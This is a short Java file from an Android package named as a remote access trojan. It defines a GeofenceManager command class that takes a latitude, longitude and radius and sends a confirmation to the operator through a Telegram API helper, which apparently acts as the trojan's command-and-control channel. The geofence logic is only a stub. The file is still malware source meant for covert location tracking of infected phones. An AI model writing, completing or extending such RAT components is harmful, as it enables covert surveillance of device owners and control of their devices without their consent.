package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;

public class GeofenceManager {
    private Context context;
    public GeofenceManager(Context context) { this.context = context; }
    public void setGeofence(double lat, double lng, float radius) {
        TelegramApi.sendMessage("🗺 Geofence set at " + lat + "," + lng + " radius " + radius + "m.");
    }
}
